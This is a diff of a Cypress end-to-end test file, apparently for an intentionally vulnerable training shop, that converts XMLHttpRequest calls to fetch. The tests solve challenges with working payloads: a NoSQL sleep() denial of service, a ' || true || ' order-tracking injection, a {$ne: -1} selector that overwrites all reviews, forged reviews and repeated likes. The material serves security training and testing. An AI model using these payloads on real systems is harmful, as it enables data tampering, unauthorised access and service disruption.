@@ -11,19 +11,15 @@ describe("/rest/products/reviews", () => {
       cy.task("disableOnContainerEnv").then((disableOnContainerEnv) => {
         if (!disableOnContainerEnv) {
           cy.window().then(() => {
-            const xhttp = new XMLHttpRequest();
-            xhttp.onreadystatechange = function () {
-              if (this.status === 200) {
-                console.log("Success");
-              }
-            };
-            xhttp.open(
-              "GET",
+            fetch(
               `${Cypress.env("baseUrl")}/rest/products/sleep(1000)/reviews`,
-              true
+              {
+                method: "GET",
+                headers: {
+                  "Content-type": "text/plain",
+                },
+              }
             );
-            xhttp.setRequestHeader("Content-type", "text/plain");
-            xhttp.send();
           });
           cy.expectChallengeSolved({ challenge: "NoSQL DoS" });
         }
@@ -35,22 +31,18 @@ describe("/rest/products/reviews", () => {
     it("should be possible to inject and get all the orders", () => {
       cy.task("disableOnContainerEnv").then((disableOnContainerEnv) => {
         if (!disableOnContainerEnv) {
-          cy.window().then(() => {
-            const xhttp = new XMLHttpRequest();
-            xhttp.onreadystatechange = function () {
-              if (this.status === 200) {
-                console.log("Success");
-              }
-            };
-            xhttp.open(
-              "GET",
+          cy.window().then(async () => {
+            await fetch(
               `${Cypress.env(
                 "baseUrl"
               )}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27`,
-              true
+              {
+                method: "GET",
+                headers: {
+                  "Content-type": "text/plain",
+                },
+              }
             );
-            xhttp.setRequestHeader("Content-type", "text/plain");
-            xhttp.send();
           });
           cy.expectChallengeSolved({ challenge: "NoSQL Exfiltration" });
         }
@@ -64,27 +56,18 @@ describe("/rest/products/reviews", () => {
     });
 
     it("should be possible to inject a selector into the update route", () => {
-      cy.window().then(() => {
-        var xhttp = new XMLHttpRequest();
-        xhttp.onreadystatechange = function () {
-          if (this.status == 200) {
-            console.log("Success");
-          }
-        };
-
-        xhttp.open(
-          "PATCH",
-          `${Cypress.env("baseUrl")}/rest/products/reviews`,
-          true
-        );
-        xhttp.setRequestHeader("Content-type", "application/json");
-        xhttp.setRequestHeader(
-          "Authorization",
-          `Bearer ${localStorage.getItem("token")}`
-        );
-        xhttp.send(
-          JSON.stringify({ id: { $ne: -1 }, message: "NoSQL Injection!" })
-        );
+      cy.window().then(async () => {
+        await fetch(`${Cypress.env("baseUrl")}/rest/products/reviews`, {
+          method: "PATCH",
+          headers: {
+            "Content-type": "application/json",
+            Authorization: `Bearer ${localStorage.getItem("token")}`,
+          },
+          body: JSON.stringify({
+            id: { $ne: -1 },
+            message: "NoSQL Injection!",
+          }),
+        });
       });
       cy.expectChallengeSolved({ challenge: "NoSQL Manipulation" });
     });
@@ -97,41 +80,37 @@ describe("/rest/products/reviews", () => {
 
     it("should be possible to edit any existing review", () => {
       cy.visit("/");
-      cy.window().then(() => {
-        const xhttp = new XMLHttpRequest();
-        xhttp.onreadystatechange = function () {
-          if (this.readyState == 4 && this.status === 200) {
-            const reviewId = JSON.parse(this.responseText).data[0]._id;
-            editReview(reviewId);
-          }
-        };
-
-        xhttp.open(
-          "GET",
+      cy.window().then(async () => {
+        let response = await fetch(
           `${Cypress.env("baseUrl")}/rest/products/1/reviews`,
-          true
+          {
+            method: "GET",
+            headers: {
+              "Content-type": "text/plain",
+            },
+          }
         );
-        xhttp.setRequestHeader("Content-type", "text/plain");
-        xhttp.send();
+        if (response.status === 200) {
+          let responseJson = await response.json();
+          const reviewId = responseJson.data[0]._id;
+          await editReview(reviewId);
+        }
 
-        function editReview(reviewId: string) {
-          const xhttp = new XMLHttpRequest();
-          xhttp.onreadystatechange = function () {
-            if (this.status === 200) {
-              console.log("Success");
-            }
-          };
-          xhttp.open(
-            "PATCH",
+        async function editReview(reviewId: string) {
+          const response = await fetch(
             `${Cypress.env("baseUrl")}/rest/products/reviews`,
-            true
+            {
+              method: "PATCH",
+              headers: {
+                "Content-type": "application/json",
+                Authorization: `Bearer ${localStorage.getItem("token")}`,
+              },
+              body: JSON.stringify({ id: reviewId, message: "injected" }),
+            }
           );
-          xhttp.setRequestHeader("Content-type", "application/json");
-          xhttp.setRequestHeader(
-            "Authorization",
-            `Bearer ${localStorage.getItem("token")}`
-          );
-          xhttp.send(JSON.stringify({ id: reviewId, message: "injected" }));
+          if (response.status === 200) {
+            console.log("Success");
+          }
         }
       });
       cy.expectChallengeSolved({ challenge: "Forged Review" });
@@ -145,43 +124,40 @@ describe("/rest/products/reviews", () => {
 
     it("should be possible to like reviews multiple times", () => {
       cy.visit("/");
-      cy.window().then(() => {
-        const xhttp = new XMLHttpRequest();
-        xhttp.onreadystatechange = function () {
-          if (this.readyState == 4 && this.status === 200) {
-            const reviewId = JSON.parse(this.responseText).data[0]._id;
-            sendPostRequest(reviewId);
-            sendPostRequest(reviewId);
-            sendPostRequest(reviewId);
-          }
-        };
-
-        xhttp.open(
-          "GET",
-          `${Cypress.env("baseUrl")}/rest/products/1/reviews`,
-          true
-        );
-        xhttp.setRequestHeader("Content-type", "text/plain");
-        xhttp.send();
-
-        function sendPostRequest(reviewId: string) {
-          const xhttp = new XMLHttpRequest();
-          xhttp.onreadystatechange = function () {
-            if (this.status === 200) {
-              console.log("Success");
-            }
-          };
-          xhttp.open(
-            "POST",
+      cy.window().then(async () => {
+        async function sendPostRequest(reviewId: string) {
+          const anotherResponse = await fetch(
             `${Cypress.env("baseUrl")}/rest/products/reviews`,
-            true
+            {
+              method: "POST",
+              headers: {
+                "Content-type": "application/json",
+                Authorization: `Bearer ${localStorage.getItem("token")}`,
+              },
+              body: JSON.stringify({ id: reviewId }),
+            }
           );
-          xhttp.setRequestHeader("Content-type", "application/json");
-          xhttp.setRequestHeader(
-            "Authorization",
-            `Bearer ${localStorage.getItem("token")}`
-          );
-          xhttp.send(JSON.stringify({ id: reviewId }));
+          if (anotherResponse.status === 200) {
+            console.log("Success");
+          }
+        }
+
+        const response = await fetch(
+          `${Cypress.env("baseUrl")}/rest/products/1/reviews`,
+          {
+            method: "GET",
+            headers: {
+              "Content-type": "text/plain",
+            },
+          }
+        );
+        if (response.status === 200) {
+          let responseJson = await response.json();
+          const reviewId = responseJson.data[0]._id;
+
+          sendPostRequest(reviewId);
+          sendPostRequest(reviewId);
+          sendPostRequest(reviewId);
         }
       });
       cy.expectChallengeSolved({ challenge: "Multiple Likes" });
